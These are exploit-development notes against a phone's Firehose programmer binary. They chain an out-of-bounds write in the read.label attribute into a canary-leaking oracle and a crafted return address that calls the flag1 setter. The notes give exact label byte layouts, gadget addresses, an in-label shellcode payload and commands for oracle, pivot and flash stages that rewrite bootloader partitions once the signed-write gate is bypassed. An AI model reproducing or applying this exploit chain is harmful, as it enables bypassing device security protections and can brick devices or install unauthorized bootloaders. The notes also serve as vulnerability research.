# CHAIN_NOTES — from `read.label` OOB write to flag1

Date: 2026-11-09
Binary: prog_firehose_ddr.elf, sha256 31ad5664023af3f9022913272e2c180fde5f658f31c9094ae9ec57c128c59086
Objective: push the `read.label` OOB write all the way to the write-permission byte
(flag1), in the style of a classic OOB-write-to-controlled-execution chain: label OOB
write -> controlled x30 -> call the flag1 setter.

## 0. What the bug gives, precisely

```
0x149a438c  bl 0x1499b158        ; vsnprintf(dst=x29-0x50, size=strlen(label)+1, "%s", label)
```

* dst = read-handler frame + 0xC0; frame is 0x160 (handler 0x149a41a4).
* Slots: `dst+0x48` canary, `dst+0x50` saved x29, `dst+0x58` saved x30,
  `dst+0x60..0x98` saved x28/x24/x23/x22/x21/x20/x19 (hole at +0x68).
* Reachable unauthenticated: `<configure ModeType="5">` + `<read label="...">`
  (flag1≠0 OR ModeType==5; auth_type≠1 branch).
* **The copy is a `%s` copy**: its length is `strlen(label)+1`, and it cannot pass
  an embedded NUL. The formatter writes exactly one extra byte: the NUL terminator
  at `dst[strlen(label)]`.

## 1. The one-slot theorem

1. A label value comes through an XML attribute; it can never contain a NUL byte.
2. Even if it could, `strlen()` at 0x149a4354/0x149a4374 stops at the first NUL, so
   the copy length stops there too. **Every byte of the overflow must be NUL-free.**
3. A 64-bit code pointer on this platform is `0x00000000_1499xxxx` / `0x00000000_
   80xxxxxx`: little-endian in the label it appears as `xx xx xx xx 00 00 00 00` —
   the four high NULs would terminate the copy.
4. Therefore **at most one slot** can hold a crafted code pointer, constructed as:

   ```
   ... label bytes ... [low 4 bytes of target] <- formatter writes its NUL here
   [3 untouched original bytes of the saved slot]
   ```

   The original saved-x30 slot's bytes 5..7 are `00 00 00` (the real return address
   is `0x149a2028`), so `x30 = 0x00000000_149a2c10` assembles correctly **iff the
   label's last 4 bytes are the target's low dword and the terminator lands on
   byte 4 of the slot**.
5. Everything beyond that terminator keeps its original stack content — it is
   *unpaintable* by this primitive.

## 2. Why the canary decides everything

* Canary slot is at `dst+0x48`, i.e. **8 bytes before** the x30 slot. The label must
  cross it to reach x30.
* Shipped constant: `0x00000000C0C0C0C0`. Bytes 4..7 are NULs *in the middle of the
  path*: a NUL-free label cannot reproduce them. A label that ends inside the canary
  matches (terminator + original zeros) but stops there — x30 is never reached.
  **On a constant-canary unit the overflow is a pure crash primitive. Full stop.**
* If the TZ seeding service (index 0xe via 0x1499db18, called from 0x149a1dc8)
  ran, the canary is 8 bytes of entropy. P(no zero byte) ≈ (255/256)^8 ≈ 96.9%.
  If it is all-nonzero, a label CAN carry it — but the value is unknown.

### 2.1 The bytewise oracle

A label of length `0x48+i` overwrites canary bytes 0..i and terminates; the cookie
check at 0x149a42bc compares all 8 bytes, but bytes i+1..7 keep their original
values. So:

* label = `known-prefix (i bytes) ++ guess` survives **iff** bytes 0..i all match.
* survival = the guess was right; silence = wrong (the CPU parks in the
  non-returning spin loop `0x149a006c`; USB stays enumerated — power-cycle needed).

Cost: up to 255 probes per byte (0x00 is unprovable — if all 255 nonzero guesses
miss, the byte is NUL and the pivot is dead on this unit), ~1024 power cycles worst
case. Implemented in `../tools/flag1_chain.py --stage oracle` (resumes from
`canary.bin` between cycles).

## 3. The one-shot pivot

Target choice — the only `bl` to the flag1 setter that a mid-function entry can use:

```
0x149a2c10  mov w0, #1
0x149a2c14  bl  0x149aabd0      ; set_flag1: [0x8046bbc0] = 1   <-- THE GOAL
0x149a2c18  ldr x1, [sp]        ; tail continues...
```

Entering here via `ret` gives us the `bl` for free (bl sets x30 = 0x149a2c18), so
`set_flag1` runs and returns into the function's own tail — no gadget loop, no
self-return. Label construction (all bytes NUL-free):

```
dst+0x00..0x47  'A'          filler (in-bounds)
dst+0x48..0x4F  canary       leaked, 8 NUL-free bytes
dst+0x50..0x57  'J'          saved x29 junk (x29 is dead at ret)
dst+0x58..0x5B  10 2c 9a 14  low dword of 0x149a2c10
dst+0x5C        00           <- formatter's auto-terminator
dst+0x5D..0x5F  00 00 00     original high bytes of saved x30
```

`--stage pivot` in `flag1_chain.py` builds and sends exactly this.

## 4. What happens after flag1 is set — and why the session dies

Full trace of the tail with the ORIGINAL stack (everything past `dst+0x5C` is
untouched; the saved-reg spills were never reached):

```
Phase B (verify-subfunction tail, sp = SP_L — the dispatcher-loop's sp):
  0x149a2c18 ldr x1,[SP_L]        memcpy src = loop-frame local slot, UNKNOWN
  0x149a2c28 bl 0x1499b390        memcpy(0x8045d67c, src, 0x100)   [mapped, harmless]
  0x149a2c3c bl 0x149a7748        log("Pre verify flash sign OK!!!")
  0x149a2c48 bl 0x149aa924        channel-close walk over [SP_L]:
                                   if [SP_L] == 0        -> skipped, safe
                                   if [SP_L] == 0x80200000 -> clean close, safe
                                   otherwise             -> 0x149ad40c pop-loop never
                                                          matches -> INFINITE PARK
  0x149a2c50 ldr x19,[SP_L+0x20]  loop frame's saved x26 — junk pointer
  0x149a2c54 ldp x29,x30,[SP_L+0x10]  x30 = 0x14999cb0  (the loop fn's TRUE saved
                                   LR — original stack, correct value!)
  0x149a2c58 add sp,sp,#0x30     sp = SP_L+0x30
  0x149a2c5c ret -> 0x14999cb0

Phase C (main's epilogue, sp = SP_L+0x30):
  0x14999cb0 ldp x29,x30,[sp,#0x10] = [SP_L+0x40]/[SP_L+0x48]
                                   = the loop frame's saved x22/x21 — DATA pointers
  0x14999cb4 add sp,sp,#0x20     sp = SP_L+0x50
  0x14999cb8 ret -> 0x149d3xxx   .rodata — XN fault (or executes garbage) => session dead
```

The slots that a clean return-to-dispatcher would need — `[SP_L+0x20]` (x19 = rx
pointer 0x8045d900) and `[SP_L+0x48]` (x30 = 0x149a1fc0, the loop top) — are both
beyond the label terminator. They cannot be written by this primitive in the same
command, and stack-painting across commands is impossible because **any label long
enough to reach them destroys that command's own x30** (the terminator can only sit
in one place).

Net effect: **flag1 := 1, then the session dies within microseconds.** A dead
session cannot carry a `<program>`; a Sahara re-upload starts a fresh programmer
with flag1 = 0. So this bug, even fully chained, does not open a same-session write
path — it is a one-shot flag setter with no consumer, plus a working canary oracle.

## 5. Why every other multi-slot idea failed (checked, not hand-waved)

| Idea | Verdict |
|---|---|
| ROP chain through the saved-reg spills (x28..x19 at dst+0x60..0x98) | spill slots hold *registers*, not return addresses; every hop needs an 8-byte code pointer per step, each with 4 NULs — impossible in one NUL-free copy |
| Chain hops via `ldp x29,x30,[sp,#imm]; add sp,#A; ret` epilogues (70 shapes enumerated, e.g. 0x1499c7f0, 0x149a8ac8, 0x149a8be0, 0x149c5c08, 0x149c33ec) | each hop's next-x30 slot needs a full pointer with NULs; also each hop consumes hundreds of label bytes and sp only walks UP — the loop's sp (SP_L) can never be restored (no `sub sp` / `mov sp,xN` gadget exists — 0 hits) |
| `orr x0,x8,x0,lsl#32 ; ldp x29,x30,[sp],#0x20 ; ret` (0x149b84b4) as an x0-builder before set_flag1 | its own epilogue loads x30 from `[sp]`-relative *loop locals* (uncontrolled); also unnecessary — `0x149a2c10` sets `w0=1` itself |
| Return to dispatcher loop top 0x149a1fc0 | needs sp = SP_L (impossible — sp only moved up) and x19/[sp,#8] = 0x8045d900 in the right slots; even with sp = SP_L+0x50 and `[sp,#8]` faked at `[SP_L+0x58]`, that slot is beyond the terminator |
| Enter verify-subfunction start 0x149a2b64 (frame 0x30) with sp = SP_L−0x30 so the tail's `add sp,sp,#0x30` restores SP_L | no gadget moves sp DOWN (0 `sub sp`-ret gadgets, 0 `mov sp,xN`); entering a `sub sp,#0x30` prologue gadget would work — but the only one (0x149a2b64) then *re-runs the RSA verify*, which is the gate we are trying to skip |
| Stack painting: earlier `<read>` commands pre-write the deeper slots | any label long enough to paint past dst+0x58 breaks *that* command's own x30 (garbage pointer with nonzero high bytes) => crash before the paint is useful |
| Embedded NULs through the raw XML (parser stores raw len) | `strlen(label)` at 0x149a4354 is called regardless; copy length stops at the first NUL of the parsed value either way |
| Leak the canary from `getsigndata`'s 208-byte "random" | the challenge random is a *different* RNG draw (and on this unit it is static across boots — proven in MEMORY_CORRUPTION_REPORT.md §3.1); no code path copies 0x149de358 to host output |
| `strb ...; ret` write gadgets (65 found, e.g. 0x149a83b4 `strb w8,[x0]; ret`) | one-slot limit applies to *them* too: entering one via x30 is the same single-crafted-slot problem, and x0 is not controllable at ret time (x0 = w20 = handler return code = 0) |

## 6. Conclusions

1. `read.label` **can** be pushed all the way to `set_flag1` — one command,
   `x30 = 0x149a2c10`, canary recovered bytewise first. That is the honest
   equivalent of a classic OOB-write chain landing in its RWX spray zone.
2. It **cannot** be turned into a partition write: the flag1 setter's continuation
   runs on original stack state that faults, and no construction restores the
   dispatcher loop. flag1 dies with the session.
3. If stage-probe says the canary is the shipped constant (`0xC0C0C0C0…`), even
   the one-shot is impossible — the overflow is a crash primitive on that unit.
4. The write gate remains openable only by the OSIG path (RSA-2048 over the static
   challenge) — signature replay, service-centre capture, or a paid loader. The
   flash flow itself (`--stage flash`) is ready the moment flag1 is up by any means.

## 7. Tooling

```
python tools/flag1_chain.py --stage probe --dry-run   # see the exact XML
python tools/flag1_chain.py --stage probe             # which kind of unit are you on
python tools/flag1_chain.py --stage oracle            # bytewise canary recovery
python tools/flag1_chain.py --stage pivot             # one-shot flag1 := 1
python tools/flag1_chain.py --stage flash            # abl_a/abl_b once flag1 is up
```

`--stage probe` never needs the canary. `--stage oracle` hangs the programmer on
every wrong guess — run it only with the phone in hand. `--stage pivot` sets
flag1 and kills the session; expect a power cycle after. `--stage flash` refuses
to run unless `getbasicdata` ACKs (flag1 != 0), sets the `transfercfg
reset_to_edl` safety net before touching abl_b, and clears it before the final
power reset.

---

## 8. EVIDENCE (2026-11-10) — the one-slot theorem is superseded

§1–§6 assumed the stack address is unknown and therefore that only *one* slot
can hold a crafted pointer. **The stack address is a fixed literal**: the entry
stub does `mov sp, x0` with `x0 = 0x149de000` (0x14999824/0x14999828), so
`dst` is always **0x149ddee0**. The label is written to a known address, so the
label itself is code — no ROP chain, no pivot, no leak.

`.bss`/stack pages are mapped with **PXN=0** (region type 0x22 takes the EL1
branch at 0x149c7a3c and keeps `x24+0x308`), so EL1 fetches from them. UXN is
set, which only blocks EL0.

The handler epilogue `add sp,sp,#0x160` (0x149a42e8) runs *before* `ret`, so sp
is back at the loop's `SP_L` when our code starts and `b 0x149a1f94`/`0x149a1fc0`
joins the dispatcher normally.

```
payload at dst:   nop ; mov w0,#0x101 ; bl set_flag1 ; b resync
```

`mov w0,#1` (`20 00 80 52`) carries a NUL and would end the label, hence
`#0x101` (`20 20 80 52`). See `EXEC_NOTES.md`; tool: `tools/exec_label.py`.

**So flags survive the command.** §4's "flag1 dies with the session" holds only
if the return faults — with the resync return it does not. The remaining gate
is the cookie alone; if it is the shipped constant (NUL mid-value) the exec path
is unavailable and the OSIG replay stays the way in.
